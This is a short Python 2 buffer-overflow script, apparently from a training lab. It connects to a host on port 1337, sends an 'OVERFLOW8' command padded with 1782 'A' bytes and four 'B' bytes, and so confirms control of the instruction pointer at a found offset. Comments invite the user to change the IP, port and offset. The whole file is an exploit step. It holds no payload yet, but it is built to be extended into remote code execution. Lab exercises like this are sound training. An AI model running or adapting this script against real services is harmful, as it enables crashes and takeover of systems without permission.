#!/usr/bin/python
import sys
import socket

shellcode = "A" * 1782 + "B" * 4 # change offset finding here


	
try:

 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.connect(('10.10.224.209', 1337)) # change ip and port here
		s.send(('OVERFLOW8 /.:/') + shellcode)
 		s.close
except:
 		print "Error connecting to server"
 		sys.exit()